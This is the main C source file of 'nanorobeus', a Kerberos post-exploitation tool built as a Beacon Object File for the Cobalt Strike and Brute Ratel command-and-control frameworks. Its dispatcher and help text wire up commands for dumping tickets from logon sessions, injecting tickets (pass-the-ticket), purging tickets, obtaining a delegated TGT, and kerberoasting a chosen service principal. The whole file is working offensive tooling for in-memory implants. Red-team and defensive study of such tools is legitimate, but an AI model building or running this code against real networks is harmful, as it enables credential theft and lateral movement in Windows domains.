#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"

#if defined(BOF) || defined(BRC4)
#ifdef CS_BOF
#include "compat.c"
#endif
#include "common.c"
#include "luid.c"
#include "sessions.c"
#include "purge.c"
#include "klist.c"
#include "base64.c"
#include "ptt.c"
#include "krb5.c"
#include "tgtdeleg.c"
#include "kerberoast.c"
#else
#include "common.h"
#include "luid.h"
#include "sessions.h"
#include "purge.h"
#include "klist.h"
#include "base64.h"
#include "ptt.h"
#include "krb5.h"
#include "tgtdeleg.h"
#include "kerberoast.h"
#endif

void execute(WCHAR **dispatch, char *command, int argc, char *argv[]);

#ifdef BOF

void go(char *args, int length)
{
    datap parser;
    BeaconDataParse(&parser, args, length);
    char *command = BeaconDataExtract(&parser, NULL);
    if (command == NULL)
    {
        command = "";
    }

    char **argv = MSVCRT$calloc(5, sizeof(char *));
    int argc = 5;
    for (int i = 0; i < argc; i++)
    {
        char *arg = BeaconDataExtract(&parser, NULL);
        if (arg == NULL)
        {
            arg = "";
        }
        argv[i] = arg;
    }

    execute(NULL, command, argc, argv);
}

#elif BRC4

void coffee(char **argv, int argc, WCHAR **dispatch)
{
    if (argc >= 1)
    {
        char *command = "";
        if (argc >= 1)
        {
            command = argv[0];
        }
        execute(dispatch, command, argc - 1, argv + 1);
    }
}

#else

int main(int argc, char *argv[])
{
    if (argc >= 2)
    {
        char *command = "";
        if (argc >= 2)
        {
            command = argv[1];
        }

        execute(NULL, command, argc - 2, argv + 2);
    }
    return 0;
}

#endif

void execute(WCHAR **dispatch, char *command, int argc, char *argv[])
{
    LUID *luid = NULL;
    BOOL currentLuid = FALSE;
    char *spn = NULL;
    char *ticket = NULL;

    for (int i = 0; i < argc; i++)
    {
        char *arg = MSVCRT$calloc(_strlen(argv[i]) + 1, sizeof(char));
        if (arg == NULL)
        {
            PRINT(dispatch, "[!] Couldn't allocate memory.\n");
            return;
        }
        _strcpy(arg, argv[i]);

        char *argValue = _strstr(arg, ":");
        if (argValue != NULL)
        {
            *argValue = '\0';
            argValue++;
        }

        if (_strcmp(arg, "/luid") == 0 && argValue != NULL && luid == NULL)
        {
            luid = MSVCRT$calloc(1, sizeof(LUID));
            luid->HighPart = 0;
            luid->LowPart = MSVCRT$strtol(argValue, NULL, 16);
            if (luid->LowPart <= 0)
            {
                MSVCRT$free(arg);
                PRINT(dispatch, "[!] Invalid LUID value.");
                return;
            }
        }
        else if (_strcmp(arg, "/all") == 0 && luid == NULL)
        {
            luid = MSVCRT$calloc(1, sizeof(LUID));
            luid->HighPart = 0;
            luid->LowPart = 0;
            currentLuid = FALSE;
        }
        else if (_strcmp(arg, "/spn") == 0 && argValue != NULL)
        {
            spn = MSVCRT$calloc(_strlen(argValue) + 1, sizeof(char));
            _strcpy(spn, argValue);
        }
        else if (_strcmp(arg, "/ticket") == 0 && argValue != NULL)
        {
            ticket = MSVCRT$calloc(_strlen(argValue) + 1, sizeof(char));
            _strcpy(ticket, argValue);
        }

        MSVCRT$free(arg);
    }

    if (_strcmp(command, "luid") == 0)
    {
        execute_luid(dispatch);
    }
    else if (
        _strcmp(command, "sessions") == 0 ||
        _strcmp(command, "klist") == 0 ||
        _strcmp(command, "dump") == 0 ||
        _strcmp(command, "purge") == 0)
    {
        if (luid == NULL)
        {
            luid = GetCurrentLUID();
            if (luid == NULL)
            {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                goto out;
            }
            currentLuid = TRUE;
        }

        if (_strcmp(command, "sessions") == 0)
        {
            execute_sessions(dispatch, *luid, currentLuid);
        }
        else if (_strcmp(command, "klist") == 0)
        {
            execute_klist(dispatch, *luid, currentLuid, FALSE);
        }
        else if (_strcmp(command, "dump") == 0)
        {
            execute_klist(dispatch, *luid, currentLuid, TRUE);
        }
        else
        {
            execute_purge(dispatch, *luid, currentLuid);
        }
    }
    else if (_strcmp(command, "ptt") == 0)
    {
        if (ticket == NULL)
        {
            PRINT(dispatch, "[!] Provide /ticket:<base64>.\n");
            goto out;
        }

        if (luid == NULL)
        {
            luid = GetCurrentLUID();
            if (luid == NULL)
            {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                goto out;
            }
            currentLuid = TRUE;
        }
        execute_ptt(dispatch, ticket, *luid, currentLuid);
    }
    else if (
        _strcmp(command, "tgtdeleg") == 0 ||
        _strcmp(command, "kerberoast") == 0)
    {
        if (spn == NULL)
        {
            PRINT(dispatch, "[!] Specify /spn:<spn>.");
            goto out;
        }

        if (_strcmp(command, "tgtdeleg") == 0)
        {
            execute_tgtdeleg(dispatch, spn);
        }
        else
        {
            execute_kerberoast(dispatch, spn);
        }
    }
    else if (_strcmp(command, "help") == 0)
    {
        char *help =
            "[*] nanorobeus 0.0.4\n"
            "[*] Command list:\n"
            "\tluid\n"
            "\tsessions     [/luid:<0x0> | /all]\n"
            "\tklist        [/luid:<0x0> | /all]\n"
            "\tdump         [/luid:<0x0> | /all]\n"
            "\tptt          /ticket:<BASE64> [/luid:<0x0>]\n"
            "\tpurge        [/luid:<0x0>]\n"
            "\ttgtdeleg     /spn:<SPN>\n"
            "\tkerberoast   /spn:<SPN>\n";
        PRINT(dispatch, help);
    }
    else
    {
        PRINT(dispatch, "[!] Unknown command.\n");
    }

out:
    if (luid != NULL)
    {
        MSVCRT$free(luid);
    }

    if (spn != NULL)
    {
        MSVCRT$free(spn);
    }

    if (ticket != NULL)
    {
        MSVCRT$free(ticket);
    }
}
